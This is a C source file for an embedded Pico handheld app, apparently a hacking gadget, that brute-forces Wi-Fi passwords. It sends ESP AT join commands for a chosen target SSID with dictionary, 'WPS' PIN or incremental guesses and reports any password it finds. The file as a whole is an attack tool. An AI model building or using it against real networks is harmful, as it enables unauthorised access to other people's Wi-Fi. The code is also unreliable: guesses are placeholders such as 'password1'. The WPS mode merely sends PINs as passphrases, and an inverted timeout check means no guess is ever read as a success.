#include "app.h"
#include "../display.h"
#include "../keys.h"
#include "../board_pins.h"
#include "pico/stdlib.h"
#include "hardware/uart.h"
#include "hardware/flash.h"
#include "hardware/sync.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#define UART_ID ESP_UART_ID
#define UART_TX_PIN ESP_UART_TX
#define UART_RX_PIN ESP_UART_RX
#define BAUD_RATE 115200

#define FLASH_TARGET_OFFSET (1024 * 1024) // 1MB offset into flash
#define MAX_WORDLIST_SIZE 32768
#define MAX_PASSWORD_LENGTH 64

typedef struct {
    bool running;
    char target_ssid[33];  // SSID to attack
    char current_password[MAX_PASSWORD_LENGTH];
    int password_index;
    int total_passwords;
    int attempts;
    bool success;
    char status_message[64];
    bool esp_initialized;
    int mode;  // 0=dictionary, 1=WPS, 2=incremental
    int edit_mode;  // 0=none, 1=edit SSID
    char wordlist_name[32];
    absolute_time_t start_time;
    absolute_time_t last_attempt_time;
} bruteforce_data_t;

static app_t bruteforce_app;
static bruteforce_data_t bruteforce_data;

static void bruteforce_init(app_t* app);
static void bruteforce_update(app_t* app);
static void bruteforce_render(app_t* app);
static void bruteforce_process_key(app_t* app, uint8_t key_code);
static void bruteforce_destroy(app_t* app);

static void init_esp_module(bruteforce_data_t* data);
static void start_bruteforce(bruteforce_data_t* data);
static void stop_bruteforce(bruteforce_data_t* data);
static void try_password(bruteforce_data_t* data);
static bool check_connection_result(bruteforce_data_t* data);
static void change_mode(bruteforce_data_t* data);
static void load_next_password(bruteforce_data_t* data);
static void uart_write_string(const char* str);
static bool uart_read_line(char* buffer, int max_len, uint32_t timeout_ms);
static void render_status(bruteforce_data_t* data);
static void render_edit_ssid(bruteforce_data_t* data);
static void append_char_to_ssid(bruteforce_data_t* data, char c);
static void delete_char_from_ssid(bruteforce_data_t* data);

app_t* register_bruteforce_app(void) {
    bruteforce_app.name = "WiFi Bruteforce";
    bruteforce_app.icon = "B";
    bruteforce_app.app_data = &bruteforce_data;
    bruteforce_app.init = bruteforce_init;
    bruteforce_app.update = bruteforce_update;
    bruteforce_app.render = bruteforce_render;
    bruteforce_app.process_key = bruteforce_process_key;
    bruteforce_app.destroy = bruteforce_destroy;
    
    return &bruteforce_app;
}

static void bruteforce_init(app_t* app) {
    bruteforce_data_t* data = (bruteforce_data_t*)app->app_data;
    
    data->running = false;
    strcpy(data->target_ssid, "");
    strcpy(data->current_password, "");
    data->password_index = 0;
    data->total_passwords = 10000; // Example value
    data->attempts = 0;
    data->success = false;
    data->esp_initialized = false;
    data->mode = 0;
    data->edit_mode = 0;
    strcpy(data->wordlist_name, "common.txt");
    strcpy(data->status_message, "Initializing ESP module...");
    
    init_esp_module(data);
}

static void bruteforce_update(app_t* app) {
    bruteforce_data_t* data = (bruteforce_data_t*)app->app_data;
    
    // Process bruteforce attempts if running
    if (data->running) {
        // Check if it's time for next attempt (rate limit to avoid flooding)
        if (absolute_time_diff_us(get_absolute_time(), data->last_attempt_time) <= -1000000) { // 1 second
            // Try next password
            try_password(data);
            data->last_attempt_time = get_absolute_time();
            
            // Check result
            if (check_connection_result(data)) {
                // Success!
                data->success = true;
                data->running = false;
                sprintf(data->status_message, "Password found: %s", data->current_password);
            } else {
                // Load next password
                load_next_password(data);
                
                // Update status
                data->attempts++;
                sprintf(data->status_message, "Attempts: %d/%d", data->attempts, data->total_passwords);
                
                // Check if we've tried all passwords
                if (data->password_index >= data->total_passwords) {
                    data->running = false;
                    strcpy(data->status_message, "All passwords tried, none worked");
                }
            }
        }
    }
}

static void bruteforce_render(app_t* app) {
    bruteforce_data_t* data = (bruteforce_data_t*)app->app_data;
    
    // Draw header
    display_fill_rect(0, 0, DISPLAY_WIDTH, 40, COLOR_DARKGRAY);
    display_draw_text_aligned(DISPLAY_WIDTH / 2, 15, "WiFi Bruteforce", FONT_LARGE, ALIGN_CENTER, COLOR_WHITE);
    
    // Draw content based on mode
    if (data->edit_mode == 1) {
        render_edit_ssid(data);
    } else {
        render_status(data);
    }
    
    // Draw footer with controls
    display_fill_rect(0, DISPLAY_HEIGHT - 30, DISPLAY_WIDTH, 30, COLOR_DARKGRAY);
    
    if (data->running) {
        display_draw_text(10, DISPLAY_HEIGHT - 20, "5:Stop 0:Back", FONT_SMALL, COLOR_WHITE);
    } else if (data->edit_mode == 1) {
        display_draw_text(10, DISPLAY_HEIGHT - 20, "5:Save 0:Cancel", FONT_SMALL, COLOR_WHITE);
    } else {
        display_draw_text(10, DISPLAY_HEIGHT - 20, "5:Start 6:Mode 8:Edit 0:Back", FONT_SMALL, COLOR_WHITE);
    }
}

static void bruteforce_process_key(app_t* app, uint8_t key_code) {
    bruteforce_data_t* data = (bruteforce_data_t*)app->app_data;
    
    if (data->edit_mode == 1) {
        // SSID editing mode
        switch (key_code) {
            case KEY_0:
                if (keys_is_pressed(KEY_CLEAR)) {
                    // Cancel editing
                    data->edit_mode = 0;
                } else {
                    append_char_to_ssid(data, '0');
                }
                break;
                
            case KEY_1:
            case KEY_2:
            case KEY_3:
            case KEY_4:
            case KEY_5:
            case KEY_6:
            case KEY_7:
            case KEY_8:
            case KEY_9:
                append_char_to_ssid(data, '0' + key_code);
                break;
                
            case KEY_CLEAR:
                delete_char_from_ssid(data);
                break;
                
            case KEY_EQUAL:
                // Save SSID
                data->edit_mode = 0;
                sprintf(data->status_message, "Target set: %s", data->target_ssid);
                break;
                
            default:
                break;
        }
    } else {
        // Normal mode
        switch (key_code) {
            case KEY_5: // Start/Stop
                if (!data->running && data->esp_initialized && strlen(data->target_ssid) > 0) {
                    start_bruteforce(data);
                } else if (data->running) {
                    stop_bruteforce(data);
                }
                break;
                
            case KEY_6: // Change mode
                if (!data->running) {
                    change_mode(data);
                }
                break;
                
            case KEY_8: // Edit SSID
                if (!data->running) {
                    data->edit_mode = 1;
                }
                break;
                
            case KEY_0: // Back to launcher
                app_manager_return_to_launcher();
                break;
                
            default:
                break;
        }
    }
}

static void bruteforce_destroy(app_t* app) {
    bruteforce_data_t* data = (bruteforce_data_t*)app->app_data;
    
    // Stop bruteforce if active
    if (data->running) {
        stop_bruteforce(data);
    }
    
    // Disconnect from any WiFi
    if (data->esp_initialized) {
        uart_write_string("AT+CWQAP\r\n");
        sleep_ms(500);
    }
}

static void init_esp_module(bruteforce_data_t* data) {
    // Initialize UART for ESP8266/ESP32 communication
    uart_init(UART_ID, BAUD_RATE);
    gpio_set_function(UART_TX_PIN, GPIO_FUNC_UART);
    gpio_set_function(UART_RX_PIN, GPIO_FUNC_UART);
    
    // Reset ESP module
    uart_write_string("AT+RST\r\n");
    sleep_ms(2000); // Wait for reset
    
    // Test AT command
    uart_write_string("AT\r\n");
    
    // Check for OK response
    char buffer[64];
    if (uart_read_line(buffer, sizeof(buffer), 1000) && strstr(buffer, "OK")) {
        data->esp_initialized = true;
        strcpy(data->status_message, "ESP module ready");
        
        // Set ESP to station mode
        uart_write_string("AT+CWMODE=1\r\n");
        sleep_ms(500);
    } else {
        strcpy(data->status_message, "ESP module not responding");
    }
}

static void start_bruteforce(bruteforce_data_t* data) {
    if (!data->esp_initialized) {
        strcpy(data->status_message, "ESP module not initialized");
        return;
    }
    
    if (strlen(data->target_ssid) == 0) {
        strcpy(data->status_message, "No target SSID set");
        return;
    }
    
    // Reset counters
    data->password_index = 0;
    data->attempts = 0;
    data->success = false;
    
    // Load first password
    load_next_password(data);
    
    // Start timer
    data->start_time = get_absolute_time();
    data->last_attempt_time = data->start_time;
    
    data->running = true;
    sprintf(data->status_message, "Starting attack on %s", data->target_ssid);
}

static void stop_bruteforce(bruteforce_data_t* data) {
    data->running = false;
    
    // Disconnect from any WiFi
    uart_write_string("AT+CWQAP\r\n");
    sleep_ms(500);
    
    if (!data->success) {
        sprintf(data->status_message, "Stopped after %d attempts", data->attempts);
    }
}

static void try_password(bruteforce_data_t* data) {
    // Try to connect with current password
    char cmd[128];
    sprintf(cmd, "AT+CWJAP=\"%s\",\"%s\"\r\n", data->target_ssid, data->current_password);
    uart_write_string(cmd);
}

static bool check_connection_result(bruteforce_data_t* data) {
    char buffer[128];
    absolute_time_t timeout = make_timeout_time_ms(5000); // 5 second timeout
    
    while (absolute_time_diff_us(get_absolute_time(), timeout) < 0) {
        if (uart_read_line(buffer, sizeof(buffer), 100)) {
            if (strstr(buffer, "OK")) {
                return true; // Connected successfully
            }
            if (strstr(buffer, "FAIL") || strstr(buffer, "ERROR")) {
                return false; // Failed to connect
            }
        }
        sleep_ms(100);
    }
    
    return false; // Timeout, assume failure
}

static void change_mode(bruteforce_data_t* data) {
    data->mode = (data->mode + 1) % 3;
    
    const char* mode_names[] = {"Dictionary Attack", "WPS Attack", "Incremental Attack"};
    sprintf(data->status_message, "Mode: %s", mode_names[data->mode]);
    
    // Update password count based on mode
    switch (data->mode) {
        case 0: // Dictionary
            data->total_passwords = 10000; // Example value
            strcpy(data->wordlist_name, "common.txt");
            break;
        case 1: // WPS
            data->total_passwords = 10000; // 10000 possible PINs
            strcpy(data->wordlist_name, "WPS PINs");
            break;
        case 2: // Incremental
            data->total_passwords = 1000; // Example value
            strcpy(data->wordlist_name, "Incremental");
            break;
    }
}

static void load_next_password(bruteforce_data_t* data) {
    // In a real implementation, this would load passwords from flash or generate them
    // For this example, we'll generate simple passwords
    
    data->password_index++;
    
    switch (data->mode) {
        case 0: // Dictionary
            // Example dictionary passwords
            sprintf(data->current_password, "password%d", data->password_index);
            break;
            
        case 1: // WPS
            // WPS PIN format (8 digits)
            sprintf(data->current_password, "%08d", data->password_index % 10000000);
            break;
            
        case 2: // Incremental
            // Simple incremental (just numbers in this example)
            sprintf(data->current_password, "%d", data->password_index);
            break;
    }
}

static void uart_write_string(const char* str) {
    uart_puts(UART_ID, str);
}

static bool uart_read_line(char* buffer, int max_len, uint32_t timeout_ms) {
    int i = 0;
    absolute_time_t timeout_time = make_timeout_time_ms(timeout_ms);
    
    while (i < max_len - 1) {
        if (absolute_time_diff_us(get_absolute_time(), timeout_time) <= 0) {
            break; // Timeout
        }
        
        if (uart_is_readable(UART_ID)) {
            char c = uart_getc(UART_ID);
            if (c == '\n') {
                buffer[i] = '\0';
                return true;
            } else if (c != '\r') {
                buffer[i++] = c;
            }
        } else {
            sleep_ms(1);
        }
    }
    
    buffer[i] = '\0';
    return i > 0; // Return true if we read anything
}

static void render_status(bruteforce_data_t* data) {
    // Draw target SSID
    display_fill_rect(10, 50, DISPLAY_WIDTH - 20, 30, COLOR_DARKGRAY);
    display_draw_rect(10, 50, DISPLAY_WIDTH - 20, 30, COLOR_WHITE);
    
    display_draw_text(20, 60, "Target:", FONT_SMALL, COLOR_WHITE);
    if (strlen(data->target_ssid) > 0) {
        display_draw_text(80, 60, data->target_ssid, FONT_SMALL, COLOR_YELLOW);
    } else {
        display_draw_text(80, 60, "[Not Set]", FONT_SMALL, COLOR_RED);
    }
    
    // Draw attack mode
    display_fill_rect(10, 90, DISPLAY_WIDTH - 20, 30, COLOR_DARKGRAY);
    display_draw_rect(10, 90, DISPLAY_WIDTH - 20, 30, COLOR_WHITE);
    
    display_draw_text(20, 100, "Mode:", FONT_SMALL, COLOR_WHITE);
    const char* mode_names[] = {"Dictionary", "WPS", "Incremental"};
    display_draw_text(80, 100, mode_names[data->mode], FONT_SMALL, COLOR_GREEN);
    display_draw_text(20, 115, data->wordlist_name, FONT_SMALL, COLOR_LIGHTGRAY);
    
    // Draw progress
    display_fill_rect(10, 130, DISPLAY_WIDTH - 20, 40, COLOR_BLACK);
    display_draw_rect(10, 130, DISPLAY_WIDTH - 20, 40, COLOR_WHITE);
    
    if (data->running || data->attempts > 0) {
        // Progress bar
        int progress_width = ((DISPLAY_WIDTH - 40) * data->attempts) / data->total_passwords;
        display_fill_rect(20, 140, progress_width, 10, COLOR_GREEN);
        display_draw_rect(20, 140, DISPLAY_WIDTH - 40, 10, COLOR_WHITE);
        
        // Progress text
        char progress_text[32];
        sprintf(progress_text, "%d/%d (%d%%)", 
                data->attempts, data->total_passwords,
                (data->attempts * 100) / (data->total_passwords > 0 ? data->total_passwords : 1));
        display_draw_text_aligned(DISPLAY_WIDTH / 2, 160, progress_text, FONT_SMALL, ALIGN_CENTER, COLOR_WHITE);
    }
    
    // Draw current password if running
    if (data->running) {
        display_fill_rect(10, 180, DISPLAY_WIDTH - 20, 30, COLOR_BLUE);
        display_draw_rect(10, 180, DISPLAY_WIDTH - 20, 30, COLOR_WHITE);
        
        display_draw_text(20, 190, "Trying:", FONT_SMALL, COLOR_WHITE);
        display_draw_text(80, 190, data->current_password, FONT_SMALL, COLOR_YELLOW);
    } else if (data->success) {
        // Show success message
        display_fill_rect(10, 180, DISPLAY_WIDTH - 20, 30, COLOR_GREEN);
        display_draw_rect(10, 180, DISPLAY_WIDTH - 20, 30, COLOR_WHITE);
        
        display_draw_text(20, 190, "Found:", FONT_SMALL, COLOR_WHITE);
        display_draw_text(80, 190, data->current_password, FONT_SMALL, COLOR_YELLOW);
    }
    
    // Draw status message
    display_draw_text_aligned(DISPLAY_WIDTH / 2, DISPLAY_HEIGHT - 40, 
                             data->status_message, FONT_SMALL, ALIGN_CENTER, COLOR_WHITE);
}

static void render_edit_ssid(bruteforce_data_t* data) {
    // Draw edit box
    display_fill_rect(20, 80, DISPLAY_WIDTH - 40, 40, COLOR_BLACK);
    display_draw_rect(20, 80, DISPLAY_WIDTH - 40, 40, COLOR_WHITE);
    
    // Draw SSID
    display_draw_text_aligned(DISPLAY_WIDTH / 2, 70, "Enter Target SSID:", FONT_SMALL, ALIGN_CENTER, COLOR_WHITE);
    display_draw_text_aligned(DISPLAY_WIDTH / 2, 100, data->target_ssid, FONT_MEDIUM, ALIGN_CENTER, COLOR_YELLOW);
    
    // Draw cursor
    int text_width = display_get_text_width(data->target_ssid, FONT_MEDIUM);
    int cursor_x = (DISPLAY_WIDTH / 2) + (text_width / 2) + 5;
    display_fill_rect(cursor_x, 95, 2, 15, COLOR_WHITE);
    
    // Draw keypad instructions
    display_draw_text_aligned(DISPLAY_WIDTH / 2, 140, "Use number keys (0-9)", FONT_SMALL, ALIGN_CENTER, COLOR_WHITE);
    display_draw_text_aligned(DISPLAY_WIDTH / 2, 160, "C to delete, = to save", FONT_SMALL, ALIGN_CENTER, COLOR_WHITE);
}

static void append_char_to_ssid(bruteforce_data_t* data, char c) {
    int len = strlen(data->target_ssid);
    if (len < 32) {
        data->target_ssid[len] = c;
        data->target_ssid[len + 1] = '\0';
    }
}

static void delete_char_from_ssid(bruteforce_data_t* data) {
    int len = strlen(data->target_ssid);
    if (len > 0) {
        data->target_ssid[len - 1] = '\0';
    }
}
